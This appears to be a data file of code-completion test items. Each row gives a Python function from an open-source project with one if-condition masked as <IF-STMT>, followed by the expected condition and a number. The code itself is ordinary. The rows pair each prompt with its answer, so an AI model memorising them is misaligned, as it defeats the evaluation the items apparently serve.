1114,def _set_account_info(self):<tab>with session_scope(self.account_id) as db_session:<tab><tab>account = db_session.query(ImapAccount).get(self.account_id)<tab><tab>self.sync_state = account.sync_state<tab><tab>self.provider = account.provider<tab><tab>self.provider_info = account.provider_info<tab><tab>self.email_address = account.email_address<tab><tab>self.auth_handler = account.auth_handler<tab><tab><IF-STMT><tab><tab><tab>self.client_cls = GmailCrispinClient<tab><tab>else:<tab><tab><tab>self.client_cls = CrispinClient,"if account . provider == ""gmail"" :",165
1115,"def make_timesheet_records():<tab>employees = get_timesheet_based_salary_slip_employee()<tab>for e in employees:<tab><tab>ts = make_timesheet(<tab><tab><tab>e.employee,<tab><tab><tab>simulate=True,<tab><tab><tab>billable=1,<tab><tab><tab>activity_type=get_random(""Activity Type""),<tab><tab><tab>company=frappe.flags.company,<tab><tab>)<tab><tab>frappe.db.commit()<tab><tab>rand = random.random()<tab><tab><IF-STMT><tab><tab><tab>make_salary_slip_for_timesheet(ts.name)<tab><tab>rand = random.random()<tab><tab>if rand >= 0.2:<tab><tab><tab>make_sales_invoice_for_timesheet(ts.name)",if rand >= 0.3 :,197
1116,"def free(self, addr, ban=0):<tab>with self.lock:<tab><tab><IF-STMT><tab><tab><tab>self.ban.append({""addr"": addr, ""counter"": ban})<tab><tab>else:<tab><tab><tab>base, bit, is_allocated = self.locate(addr)<tab><tab><tab>if len(self.addr_map) <= base:<tab><tab><tab><tab>raise KeyError(""address is not allocated"")<tab><tab><tab>if self.addr_map[base] & (1 << bit):<tab><tab><tab><tab>raise KeyError(""address is not allocated"")<tab><tab><tab>self.allocated -= 1<tab><tab><tab>self.addr_map[base] ^= 1 << bit",if ban != 0 :,155
1117,"def flush_log(self):<tab>try:<tab><tab>while len(self.log_buffer) > 0:<tab><tab><tab>level, message = self.log_buffer.pop(0)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._display_log(message, level)<tab>except IndexError:<tab><tab>pass",if level <= self . log_level :,82
1118,"def check(self):<tab>global MySQLdb<tab>import MySQLdb<tab>try:<tab><tab>args = {}<tab><tab>if mysql_user:<tab><tab><tab>args[""user""] = mysql_user<tab><tab>if mysql_pwd:<tab><tab><tab>args[""passwd""] = mysql_pwd<tab><tab>if mysql_host:<tab><tab><tab>args[""host""] = mysql_host<tab><tab><IF-STMT><tab><tab><tab>args[""port""] = mysql_port<tab><tab>if mysql_socket:<tab><tab><tab>args[""unix_socket""] = mysql_socket<tab><tab>self.db = MySQLdb.connect(**args)<tab>except Exception as e:<tab><tab>raise Exception(""Cannot interface with MySQL server: %s"" % e)",if mysql_port :,167
1119,"def get_middleware_resolvers(middlewares):<tab>for middleware in middlewares:<tab><tab># If the middleware is a function instead of a class<tab><tab><IF-STMT><tab><tab><tab>yield middleware<tab><tab>if not hasattr(middleware, MIDDLEWARE_RESOLVER_FUNCTION):<tab><tab><tab>continue<tab><tab>yield getattr(middleware, MIDDLEWARE_RESOLVER_FUNCTION)",if inspect . isfunction ( middleware ) :,93
1120,"def get_sentence(self):<tab>while True:<tab><tab>self._seed += 1<tab><tab>all_files = list(self._all_files)<tab><tab><IF-STMT><tab><tab><tab>if self._n_gpus > 1:<tab><tab><tab><tab>random.seed(self._seed)<tab><tab><tab>random.shuffle(all_files)<tab><tab>for file_path in all_files:<tab><tab><tab>for ret in self._load_file(file_path):<tab><tab><tab><tab>yield ret<tab><tab>if self._mode == ""test"":<tab><tab><tab>break",if self . _shuffle :,134
1121,"def extract_cookies(self, response, request):<tab>""""""Extract cookies from response, where allowable given the request.""""""<tab>_debug(""extract_cookies: %s"", response.info())<tab>self._cookies_lock.acquire()<tab>try:<tab><tab>self._policy._now = self._now = int(time.time())<tab><tab>for cookie in self.make_cookies(response, request):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>_debug("" setting cookie: %s"", cookie)<tab><tab><tab><tab>self.set_cookie(cookie)<tab>finally:<tab><tab>self._cookies_lock.release()","if self . _policy . set_ok ( cookie , request ) :",152
1122,"def _gen_filename(self, name):<tab>if name == ""in_average"":<tab><tab>avg_subject = str(self.inputs.hemisphere) + "".EC_average""<tab><tab>avg_directory = os.path.join(self.inputs.subjects_dir, avg_subject)<tab><tab><IF-STMT><tab><tab><tab>fs_home = os.path.abspath(os.environ.get(""FREESURFER_HOME""))<tab><tab>return avg_subject<tab>elif name == ""out_file"":<tab><tab>return self._list_outputs()[name]<tab>else:<tab><tab>return None",if not os . path . isdir ( avg_directory ) :,150
1123,"def decorated_view(*args, **kwargs):<tab>h = {}<tab>mechanisms = [(method, login_mechanisms.get(method)) for method in auth_methods]<tab>for method, mechanism in mechanisms:<tab><tab>if mechanism and mechanism():<tab><tab><tab>return fn(*args, **kwargs)<tab><tab><IF-STMT><tab><tab><tab>r = _security.default_http_auth_realm<tab><tab><tab>h[""WWW-Authenticate""] = 'Basic realm=""%s""' % r<tab>if _security._unauthorized_callback:<tab><tab>return _security._unauthorized_callback()<tab>else:<tab><tab>return _get_unauthorized_response(headers=h)","elif method == ""basic"" :",158
1124,"def _iterate_files(self, files, root, include_checksums, relpath):<tab>file_list = {}<tab>for file in files:<tab><tab>exclude = False<tab><tab># exclude defined filename patterns<tab><tab>for pattern in S3Sync.exclude_files:<tab><tab><tab>if fnmatch.fnmatch(file, pattern):<tab><tab><tab><tab>exclude = True<tab><tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>full_path = root + ""/"" + file<tab><tab><tab>if include_checksums:<tab><tab><tab><tab># get checksum<tab><tab><tab><tab>checksum = self._hash_file(full_path)<tab><tab><tab>else:<tab><tab><tab><tab>checksum = """"<tab><tab><tab>file_list[relpath + file] = [full_path, checksum]<tab>return file_list",if not exclude :,184
1125,"def attr(**kw):<tab>kw = kw.items()<tab>kw.sort()<tab>parts = []<tab>for name, value in kw:<tab><tab>if value is None:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>name = name[:-1]<tab><tab>parts.append('%s=""%s""' % (html_quote(name), html_quote(value)))<tab>return html("" "".join(parts))","if name . endswith ( ""_"" ) :",100
1126,"def create(self):<tab>if not self.created:<tab><tab>self.created = True<tab><tab>cmd = self._mode<tab><tab><IF-STMT><tab><tab><tab>cmd = u""""<tab><tab>vim.command(<tab><tab><tab>(u"":%snoremap %s %s"" % (cmd, str(self), self.command)).encode(u""utf-8"")<tab><tab>)",if cmd == MODE_ALL :,97
1127,"def get_tokens_unprocessed(self, text):<tab>for index, token, value in RegexLexer.get_tokens_unprocessed(self, text):<tab><tab><IF-STMT><tab><tab><tab>if self.stdlibhighlighting and value in self.stdlib_types:<tab><tab><tab><tab>token = Keyword.Type<tab><tab><tab>elif self.c99highlighting and value in self.c99_types:<tab><tab><tab><tab>token = Keyword.Type<tab><tab><tab>elif self.platformhighlighting and value in self.linux_types:<tab><tab><tab><tab>token = Keyword.Type<tab><tab>yield index, token, value",if token is Name :,141
1128,"def _merge_colormaps(kwargs):<tab>""""""Merge colormaps listed in kwargs.""""""<tab>from trollimage.colormap import Colormap<tab>full_cmap = None<tab>palette = kwargs[""palettes""]<tab>if isinstance(palette, Colormap):<tab><tab>full_cmap = palette<tab>else:<tab><tab>for itm in palette:<tab><tab><tab>cmap = create_colormap(itm)<tab><tab><tab>cmap.set_range(itm[""min_value""], itm[""max_value""])<tab><tab><tab><IF-STMT><tab><tab><tab><tab>full_cmap = cmap<tab><tab><tab>else:<tab><tab><tab><tab>full_cmap = full_cmap + cmap<tab>return full_cmap",if full_cmap is None :,156
1129,"def from_text(cls, rdclass, rdtype, tok, origin=None, relativize=True):<tab>key_tag = tok.get_uint16()<tab>algorithm = tok.get_uint8()<tab>digest_type = tok.get_uint8()<tab>chunks = []<tab>while 1:<tab><tab>t = tok.get().unescape()<tab><tab>if t.is_eol_or_eof():<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>raise dns.exception.SyntaxError<tab><tab>chunks.append(t.value)<tab>digest = """".join(chunks)<tab>digest = digest.decode(""hex_codec"")<tab>return cls(rdclass, rdtype, key_tag, algorithm, digest_type, digest)",if not t . is_identifier ( ) :,180
1130,"def connect_reader_to_writer(reader, writer):<tab>BUF_SIZE = 8192<tab>try:<tab><tab>while True:<tab><tab><tab>data = await reader.read(BUF_SIZE)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if not writer.transport.is_closing():<tab><tab><tab><tab><tab>writer.write_eof()<tab><tab><tab><tab><tab>await writer.drain()<tab><tab><tab><tab>return<tab><tab><tab>writer.write(data)<tab><tab><tab>await writer.drain()<tab>except (OSError, asyncio.IncompleteReadError) as e:<tab><tab>pass",if not data :,139
1131,"def _get_cuda_device(*args):<tab># Returns cuda.Device or DummyDevice.<tab>for arg in args:<tab><tab>if type(arg) is not bool and isinstance(arg, _integer_types):<tab><tab><tab>check_cuda_available()<tab><tab><tab>return Device(arg)<tab><tab>if isinstance(arg, ndarray):<tab><tab><tab>if arg.device is None:<tab><tab><tab><tab>continue<tab><tab><tab>return arg.device<tab><tab><IF-STMT><tab><tab><tab>return arg<tab># NOTE: This function returns DummyDevice for both NumPy and ChainerX<tab>return DummyDevice","if available and isinstance ( arg , Device ) :",144
1132,"def skip_to_semicolon(s, i):<tab>n = len(s)<tab>while i < n:<tab><tab>c = s[i]<tab><tab>if c == "";"":<tab><tab><tab>return i<tab><tab><IF-STMT><tab><tab><tab>i = g.skip_string(s, i)<tab><tab>elif g.match(s, i, ""//""):<tab><tab><tab>i = g.skip_to_end_of_line(s, i)<tab><tab>elif g.match(s, i, ""/*""):<tab><tab><tab>i = g.skip_block_comment(s, i)<tab><tab>else:<tab><tab><tab>i += 1<tab>return i","elif c == ""'"" or c == '""' :",161
1133,"def build_CallFunc(self, o):<tab>children = o.getChildren()<tab># Build callee from first child<tab>callee = self.build(children[0])<tab># Build args and kwargs from remaining children<tab>args = []<tab>kwargs = {}<tab>for child in children[1:]:<tab><tab>class_name = child.__class__.__name__<tab><tab># None is ignored<tab><tab>if class_name == ""NoneType"":<tab><tab><tab>continue<tab><tab># Keywords become kwargs<tab><tab><IF-STMT><tab><tab><tab>kwargs.update(self.build(child))<tab><tab># Everything else becomes args<tab><tab>else:<tab><tab><tab>args.append(self.build(child))<tab>return callee(*args, **kwargs)","if class_name == ""Keyword"" :",175
1134,"def _extract_constant_functions(slither: SlitherCore) -> Dict[str, List[str]]:<tab>ret: Dict[str, List[str]] = {}<tab>for contract in slither.contracts:<tab><tab>cst_functions = [<tab><tab><tab>_get_name(f) for f in contract.functions_entry_points if _is_constant(f)<tab><tab>]<tab><tab>cst_functions += [<tab><tab><tab>v.function_name<tab><tab><tab>for v in contract.state_variables<tab><tab><tab><IF-STMT><tab><tab>]<tab><tab>if cst_functions:<tab><tab><tab>ret[contract.name] = cst_functions<tab>return ret","if v . visibility in [ ""public"" ]",166
1135,"def acquire_read_lock(self, wait=True):<tab>state = self.state<tab>if state.writing:<tab><tab>raise LockError(""lock is in writing state"")<tab>if state.reentrantcount == 0:<tab><tab>x = self.do_acquire_read_lock(wait)<tab><tab><IF-STMT><tab><tab><tab>state.reentrantcount += 1<tab><tab><tab>state.reading = True<tab><tab>return x<tab>elif state.reading:<tab><tab>state.reentrantcount += 1<tab><tab>return True",if wait or x :,124
1136,"def get_optional_nargs(self, name):<tab>for n, kwargs in self.conf[""optional_args""]:<tab><tab><IF-STMT><tab><tab><tab>if ""action"" in kwargs:<tab><tab><tab><tab>action = kwargs[""action""]<tab><tab><tab><tab>if action in (""store_true"", ""store_false""):<tab><tab><tab><tab><tab>return 0<tab><tab><tab>break<tab>return 1",if name == n :,92
1137,"def _requests_to_follow(self, response):<tab>if not isinstance(response, HtmlResponse):<tab><tab>return<tab>seen = set()<tab>for n, rule in enumerate(self._rules):<tab><tab>links = [<tab><tab><tab>lnk<tab><tab><tab>for lnk in rule.link_extractor.extract_links(response)<tab><tab><tab><IF-STMT><tab><tab>]<tab><tab>if links and rule.process_links:<tab><tab><tab>links = rule.process_links(links)<tab><tab>for link in links:<tab><tab><tab>seen.add(link)<tab><tab><tab>request = self._build_request(n, link)<tab><tab><tab>yield rule._process_request(request, response)",if lnk not in seen,168
1138,"def process_module(name, module, parent):<tab>if parent:<tab><tab>modules[parent][""items""].append(name)<tab><tab>mg = module_groups.setdefault(name, [])<tab><tab>mg.append(parent)<tab><tab>if get_module_type(name) == ""py3status"":<tab><tab><tab>module["".group""] = parent<tab># check module content<tab>for k, v in list(module.items()):<tab><tab><IF-STMT><tab><tab><tab># on_click event<tab><tab><tab>process_onclick(k, v, name)<tab><tab><tab># on_click should not be passed to the module via the config.<tab><tab><tab>del module[k]<tab><tab>if isinstance(v, ModuleDefinition):<tab><tab><tab># we are a container<tab><tab><tab>module[""items""] = []<tab>return module","if k . startswith ( ""on_click"" ) :",198
1139,"def _mysql_version_validator(version, sku_info, tier):<tab>if version:<tab><tab>versions = get_mysql_versions(sku_info, tier)<tab><tab><IF-STMT><tab><tab><tab>raise CLIError(<tab><tab><tab><tab>""Incorrect value for --version. Allowed values : {}"".format(versions)<tab><tab><tab>)",if version not in versions :,83
1140,"def do_blocking_test(self, block_func, block_args, trigger_func, trigger_args):<tab>thread = _TriggerThread(trigger_func, trigger_args)<tab>thread.start()<tab>try:<tab><tab>self.result = block_func(*block_args)<tab><tab># If block_func returned before our thread made the call, we failed!<tab><tab><IF-STMT><tab><tab><tab>self.fail(""blocking function '%r' appeared not to block"" % block_func)<tab><tab>return self.result<tab>finally:<tab><tab>thread.join(10)  # make sure the thread terminates<tab><tab>if thread.is_alive():<tab><tab><tab>self.fail(""trigger function '%r' appeared to not return"" % trigger_func)",if not thread . startedEvent . is_set ( ) :,183
1141,"def _fatal_error(self, exc, message=""Fatal error on pipe transport""):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>if self._loop.get_debug():<tab><tab><tab><tab>logger.debug(""%r: %s"", self, message, exc_info=True)<tab><tab>else:<tab><tab><tab>self._loop.call_exception_handler(<tab><tab><tab><tab>{<tab><tab><tab><tab><tab>""message"": message,<tab><tab><tab><tab><tab>""exception"": exc,<tab><tab><tab><tab><tab>""transport"": self,<tab><tab><tab><tab><tab>""protocol"": self._protocol,<tab><tab><tab><tab>}<tab><tab><tab>)<tab>finally:<tab><tab>self._force_close(exc)","if isinstance ( exc , OSError ) :",167
1142,"def run_test_family(tests, mode_filter, files, open_func, *make_args):<tab>for test_func in tests:<tab><tab><IF-STMT><tab><tab><tab>out.write(""\n"")<tab><tab><tab>continue<tab><tab>if mode_filter in test_func.file_open_mode:<tab><tab><tab>continue<tab><tab>for s in test_func.file_sizes:<tab><tab><tab>name, size = files[size_names[s]]<tab><tab><tab># name += file_ext<tab><tab><tab>args = tuple(f(name, size) for f in make_args)<tab><tab><tab>run_one_test(name, size, open_func, test_func, *args)",if test_func is None :,168
1143,"def py__get__(self, obj):<tab># Arguments in __get__ descriptors are obj, class.<tab># `method` is the new parent of the array, don't know if that's good.<tab>names = self.get_function_slot_names(""__get__"")<tab>if names:<tab><tab><IF-STMT><tab><tab><tab>return self.execute_function_slots(names, obj, obj.class_context)<tab><tab>else:<tab><tab><tab>none_obj = compiled.create(self.evaluator, None)<tab><tab><tab>return self.execute_function_slots(names, none_obj, obj)<tab>else:<tab><tab>return ContextSet(self)","if isinstance ( obj , AbstractInstanceContext ) :",159
1144,"def _options_fcheck(self, name, xflags, table):<tab>for entry in table:<tab><tab>if entry.name is None:<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>raise XTablesError(""%s: --%s must be specified"" % (name, entry.name))<tab><tab><tab>if not xflags & (1 << entry.id):<tab><tab><tab><tab>continue",if entry . flags & XTOPT_MAND and not xflags & ( 1 << entry . id ) :,112
1145,"def _consumer_healthy(self):<tab>abnormal_num = 0<tab>for w in self._consumers:<tab><tab>if not w.is_alive() and w.id not in self._consumer_endsig:<tab><tab><tab>abnormal_num += 1<tab><tab><tab><IF-STMT><tab><tab><tab><tab>errmsg = ""consumer[{}] exit abnormally with exitcode[{}]"".format(<tab><tab><tab><tab><tab>w.pid, w.exitcode<tab><tab><tab><tab>)<tab><tab><tab>else:<tab><tab><tab><tab>errmsg = ""consumer[{}] exit abnormally"".format(w.ident)<tab><tab><tab>logger.warn(errmsg)<tab>if abnormal_num > 0:<tab><tab>logger.warn(""{} consumers have exited abnormally!!!"".format(abnormal_num))<tab>return abnormal_num == 0",if self . _use_process :,186
1146,"def extract_groups(self, text: str, language_code: str):<tab>previous = None<tab>group = 1<tab>groups = []<tab>words = []<tab>ignored = IGNORES.get(language_code, {})<tab>for word in NON_WORD.split(text):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if word not in ignored and len(word) >= 2:<tab><tab><tab>if previous == word:<tab><tab><tab><tab>group += 1<tab><tab><tab>elif group > 1:<tab><tab><tab><tab>groups.append(group)<tab><tab><tab><tab>words.append(previous)<tab><tab><tab><tab>group = 1<tab><tab>previous = word<tab>if group > 1:<tab><tab>groups.append(group)<tab><tab>words.append(previous)<tab>return groups, words",if not word :,187
1147,"def _validate_callbacks(cls, callbacks):<tab>for callback in callbacks:<tab><tab>if not isinstance(callback, Callback):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise TypeError(""Make sure to instantiate the callbacks."")<tab><tab><tab>raise TypeError(""Only accepts a `callbacks` instance."")","if issubclass ( callback , Callback ) :",70
1148,"def convert_errors(from_, to, msg=None):<tab>exc = None<tab>try:<tab><tab>yield None<tab>except from_ as e:<tab><tab>exc = e<tab>if exc:<tab><tab>info = ""%s: %s"" % (exc.__class__.__name__, str(exc))<tab><tab><IF-STMT><tab><tab><tab>info = ""%s: %s"" % (msg, info)<tab><tab>raise to(info)",if msg :,102
1149,"def delete_loan(loan_key, loan=None):<tab><IF-STMT><tab><tab>loan = web.ctx.site.store.get(loan_key)<tab><tab>if not loan:<tab><tab><tab>raise Exception(""Could not find store record for %s"", loan_key)<tab>loan.delete()",if not loan :,81
1150,"def last_action_for(self, agent_id: AgentID = _DUMMY_AGENT_ID) -> EnvActionType:<tab>""""""Returns the last action for the specified agent, or zeros.""""""<tab>if agent_id in self._agent_to_last_action:<tab><tab>return flatten_to_single_ndarray(self._agent_to_last_action[agent_id])<tab>else:<tab><tab>policy = self._policies[self.policy_for(agent_id)]<tab><tab>flat = flatten_to_single_ndarray(policy.action_space.sample())<tab><tab><IF-STMT><tab><tab><tab>return np.zeros_like(flat, dtype=policy.action_space.dtype)<tab><tab>return np.zeros_like(flat)","if hasattr ( policy . action_space , ""dtype"" ) :",185
1151,"def on_leave(<tab>self, original_node: CSTNodeT, updated_node: CSTNodeT) -> Union[cst.Import, cst.ImportFrom, CSTNodeT, RemovalSentinel]:<tab>if isinstance(updated_node, cst.Import):<tab><tab>for alias in updated_node.names:<tab><tab><tab>name = alias.name<tab><tab><tab>if isinstance(name, cst.Name) and name.value == ""b"":<tab><tab><tab><tab>return cst.RemoveFromParent()<tab>elif isinstance(updated_node, cst.ImportFrom):<tab><tab>module = updated_node.module<tab><tab><IF-STMT><tab><tab><tab>return cst.RemoveFromParent()<tab>return updated_node","if isinstance ( module , cst . Name ) and module . value == ""e"" :",183
1152,"def sortkey(self, r, prog=None):<tab>ret = []<tab>for col, reverse in self._ordering:<tab><tab><IF-STMT><tab><tab><tab>col = self.column(col)<tab><tab>val = col.getTypedValue(r)<tab><tab>ret.append(Reversor(val) if reverse else val)<tab>if prog:<tab><tab>prog.addProgress(1)<tab>return ret","if isinstance ( col , str ) :",102
1153,"def down_button_clicked(self, obj):<tab>ref = self.get_selected()<tab>if ref and ref[1] is not None:<tab><tab>pos = self.find_index(ref)<tab><tab><IF-STMT><tab><tab><tab>self._move_down(pos, ref[1])<tab>elif ref and ref[1] is None:<tab><tab>self._move_down_group(ref[0])",if pos [ 1 ] >= 0 and pos [ 1 ] < len ( self . get_data ( ) [ pos [ 0 ] ] ) - 1 :,122
1154,"def maybe_swap_for_shadow_path(self, path: str) -> str:<tab>if not self.shadow_map:<tab><tab>return path<tab>path = normpath(path, self.options)<tab>previously_checked = path in self.shadow_equivalence_map<tab>if not previously_checked:<tab><tab>for source, shadow in self.shadow_map.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.shadow_equivalence_map[path] = shadow<tab><tab><tab><tab>break<tab><tab><tab>else:<tab><tab><tab><tab>self.shadow_equivalence_map[path] = None<tab>shadow_file = self.shadow_equivalence_map.get(path)<tab>return shadow_file if shadow_file else path","if self . fscache . samefile ( path , source ) :",179
1155,"def _add_kid(key, x):<tab>if x is None:<tab><tab>kids[key] = None<tab>else:<tab><tab>if type(x) in (type([]), type(())):<tab><tab><tab>x1 = [i for i in x if isinstance(i, TVTKBase)]<tab><tab><tab>if x1:<tab><tab><tab><tab>kids[key] = x1<tab><tab><IF-STMT><tab><tab><tab>if hasattr(x, ""__iter__""):<tab><tab><tab><tab># Don't add iterable objects that contain non<tab><tab><tab><tab># acceptable nodes<tab><tab><tab><tab>if len(list(x)) and isinstance(list(x)[0], TVTKBase):<tab><tab><tab><tab><tab>kids[key] = x<tab><tab><tab>else:<tab><tab><tab><tab>kids[key] = x","elif isinstance ( x , TVTKBase ) :",196
1156,"def find_zone_id(domain, client=None):<tab>paginator = client.get_paginator(""list_hosted_zones"")<tab>zones = []<tab>for page in paginator.paginate():<tab><tab>for zone in page[""HostedZones""]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if not zone[""Config""][""PrivateZone""]:<tab><tab><tab><tab><tab>zones.append((zone[""Name""], zone[""Id""]))<tab>if not zones:<tab><tab>raise ValueError(""Unable to find a Route53 hosted zone for {}"".format(domain))<tab>return zones[0][1]","if domain . endswith ( zone [ ""Name"" ] ) or ( domain + ""."" ) . endswith ( zone [ ""Name"" ] ) :",147
1157,"def render(self, context):<tab>for condition, nodelist in self.conditions_nodelists:<tab><tab>if condition is not None:  # if / elif clause<tab><tab><tab>try:<tab><tab><tab><tab>match = condition.eval(context)<tab><tab><tab>except VariableDoesNotExist:<tab><tab><tab><tab>match = None<tab><tab>else:  # else clause<tab><tab><tab>match = True<tab><tab><IF-STMT><tab><tab><tab>return nodelist.render(context)<tab>return """"",if match :,109
1158,"def init_weight(self):<tab>if self.pretrained is not None:<tab><tab>load_entire_model(self, self.pretrained)<tab>else:<tab><tab>for sublayer in self.sublayers():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>kaiming_normal_init(sublayer.weight)<tab><tab><tab>elif isinstance(sublayer, (nn.BatchNorm, nn.SyncBatchNorm)):<tab><tab><tab><tab>kaiming_normal_init(sublayer.weight)","if isinstance ( sublayer , nn . Conv2D ) :",120
1159,"def _next_empty_row(view, pt):<tab>r = utils.row_at(view, pt)<tab>while True:<tab><tab>r += 1<tab><tab>pt = view.text_point(r, 0)<tab><tab>if utils.row_at(view, pt) == utils.last_row(view):<tab><tab><tab>return view.size(), True<tab><tab><IF-STMT><tab><tab><tab>return pt, False",if view . line ( pt ) . empty ( ) :,106
1160,"def __init__(self, parent, name, max_size=None, description=None):<tab>Field.__init__(self, parent, name, size=0, description=description)<tab>value = 0<tab>addr = self.absolute_address<tab>while max_size is None or self._size < max_size:<tab><tab>byte = parent.stream.readBits(addr, 8, LITTLE_ENDIAN)<tab><tab>value += byte<tab><tab>self._size += 8<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>addr += 8<tab>self.createValue = lambda: value",if byte != 0xFF :,140
1161,"def xdir(obj, return_values=False):<tab>for attr in dir(obj):<tab><tab>if attr[:2] != ""__"" and attr[-2:] != ""__"":<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield attr, getattr(obj, attr)<tab><tab><tab>else:<tab><tab><tab><tab>yield attr",if return_values :,76
1162,"def _extract_changes(doc_map, changes, read_time):<tab>deletes = []<tab>adds = []<tab>updates = []<tab>for name, value in changes.items():<tab><tab>if value == ChangeType.REMOVED:<tab><tab><tab>if name in doc_map:<tab><tab><tab><tab>deletes.append(name)<tab><tab><IF-STMT><tab><tab><tab>if read_time is not None:<tab><tab><tab><tab>value.read_time = read_time<tab><tab><tab>updates.append(value)<tab><tab>else:<tab><tab><tab>if read_time is not None:<tab><tab><tab><tab>value.read_time = read_time<tab><tab><tab>adds.append(value)<tab>return (deletes, adds, updates)",elif name in doc_map :,173
1163,"def endElement(self, name):<tab>if self._is_active is True:<tab><tab><IF-STMT><tab><tab><tab>self._is_active = False<tab><tab><tab>self._tag_level = None<tab><tab><tab>if _callable(self._callback):<tab><tab><tab><tab>self._callback(self._record)<tab><tab><tab>self._record = None<tab><tab>elif self._level == self._tag_level + 1:<tab><tab><tab>if name != ""xref"":<tab><tab><tab><tab>self._record[name] = """".join(self._tag_payload)<tab><tab><tab><tab>self._tag_payload = None<tab><tab><tab><tab>self._tag_feeding = False<tab>self._level -= 1","if name == ""record"" and self . _tag_level == self . _level :",175
1164,"def init_worker(<tab>status_queue: multiprocessing.SimpleQueue,<tab>param_queue: multiprocessing.SimpleQueue,<tab>result_queue: multiprocessing.SimpleQueue,) -> None:<tab>global result<tab>global coverage_run<tab># Make sure the generator is re-seeded, as we have inherited<tab># the seed from the parent process.<tab>random.seed()<tab>result = ChannelingTestResult(result_queue)<tab>if not param_queue.empty():<tab><tab>server_addr = param_queue.get()<tab><tab><IF-STMT><tab><tab><tab>os.environ[""EDGEDB_TEST_CLUSTER_ADDR""] = json.dumps(server_addr)<tab>coverage_run = devmode.CoverageConfig.start_coverage_if_requested()<tab>status_queue.put(True)",if server_addr is not None :,190
1165,"def wait(uuid: str, kind: str, max_retries: int):<tab>""""""Delete an s3 subpath.""""""<tab>from polyaxon import settings<tab>from polyaxon.agents.spawners.spawner import Spawner<tab>spawner = Spawner(namespace=settings.CLIENT_CONFIG.namespace, in_cluster=True)<tab>retry = 1<tab>while retry < max_retries:<tab><tab>try:<tab><tab><tab>k8s_operation = spawner.get(run_uuid=uuid, run_kind=kind)<tab><tab>except:  # noqa<tab><tab><tab>k8s_operation = None<tab><tab><IF-STMT><tab><tab><tab>retry += 1<tab><tab><tab>time.sleep(retry)<tab><tab>else:<tab><tab><tab>return<tab>sys.exit(1)",if k8s_operation :,187
1166,def _get_data_fields():<tab>global supported_kinds<tab>ret = []<tab>for data in supported_kinds:<tab><tab>msg = ifinfmsg.ifinfo.data_map.get(data)<tab><tab>if msg is not None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ret += [msg.nla2name(i[0]) for i in msg.nla_map]<tab><tab><tab>else:<tab><tab><tab><tab>ret += [ifinfmsg.nla2name(i[0]) for i in msg.nla_map]<tab>return ret,"if getattr ( msg , ""prefix"" , None ) is not None :",146
1167,"def loop_check(self):<tab>in_loop = []<tab># Add the tag for dfs check<tab>for node in self.nodes:<tab><tab>node.dfs_loop_status = ""DFS_UNCHECKED""<tab># Now do the job<tab>for node in self.nodes:<tab><tab># Run the dfs only if the node has not been already done */<tab><tab><IF-STMT><tab><tab><tab>self.dfs_loop_search(node)<tab><tab># If LOOP_INSIDE, must be returned<tab><tab>if node.dfs_loop_status == ""DFS_LOOP_INSIDE"":<tab><tab><tab>in_loop.append(node)<tab># Remove the tag<tab>for node in self.nodes:<tab><tab>del node.dfs_loop_status<tab>return in_loop","if node . dfs_loop_status == ""DFS_UNCHECKED"" :",199
1168,"def _find_config(args, app_desc):<tab>path = os.path.join(args.galaxy_root, app_desc.destination)<tab>if not os.path.exists(path):<tab><tab>path = None<tab><tab>for possible_ini_config_rel in app_desc.config_paths:<tab><tab><tab>possible_ini_config = os.path.join(<tab><tab><tab><tab>args.galaxy_root, possible_ini_config_rel<tab><tab><tab>)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>path = possible_ini_config<tab>if path is None:<tab><tab>_warn(USING_SAMPLE_MESSAGE % path)<tab><tab>path = os.path.join(args.galaxy_root, app_desc.sample_destination)<tab>return path",if os . path . exists ( possible_ini_config ) :,198
1169,"def parseArgs(self, argv):<tab>if sys.version_info < (3, 4):<tab><tab># We want these options to work on all versions, emulate them.<tab><tab>if ""-R"" in argv:<tab><tab><tab>argv.remove(""-R"")<tab><tab><tab>self.refleak = True<tab><tab><IF-STMT><tab><tab><tab>argv.remove(""-m"")<tab><tab><tab>self.multiprocess = True<tab>super(NumbaTestProgram, self).parseArgs(argv)<tab>if self.verbosity <= 0:<tab><tab># We aren't interested in informational messages / warnings when<tab><tab># running with '-q'.<tab><tab>self.buffer = True","if ""-m"" in argv :",160
1170,"def filter_custom_selected_callback(indices, old, new):<tab>logger.info(""filter custom callback"")<tab>filter_label.text = ""Please Wait...""<tab>global all_topics, apply_filter<tab>if new != [-1]:<tab><tab>apply_filter = True<tab><tab>selected_topics = [filter_custom_table_source.data[""topics""][x] for x in new]<tab><tab>for i, line in enumerate(all_topics):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>all_topics[i][2] = ""1""<tab><tab><tab>else:<tab><tab><tab><tab>all_topics[i][2] = ""0""<tab>filter_label.text = """"",if line [ 0 ] in selected_topics :,168
1171,"def number_operators(self, a, b, skip=[]):<tab>dict = {""a"": a, ""b"": b}<tab>for name, expr in self.binops.items():<tab><tab>if name not in skip:<tab><tab><tab>name = ""__%s__"" % name<tab><tab><tab><IF-STMT><tab><tab><tab><tab>res = eval(expr, dict)<tab><tab><tab><tab>self.binop_test(a, b, res, expr, name)<tab>for name, expr in list(self.unops.items()):<tab><tab>if name not in skip:<tab><tab><tab>name = ""__%s__"" % name<tab><tab><tab>if hasattr(a, name):<tab><tab><tab><tab>res = eval(expr, dict)<tab><tab><tab><tab>self.unop_test(a, res, expr, name)","if hasattr ( a , name ) :",189
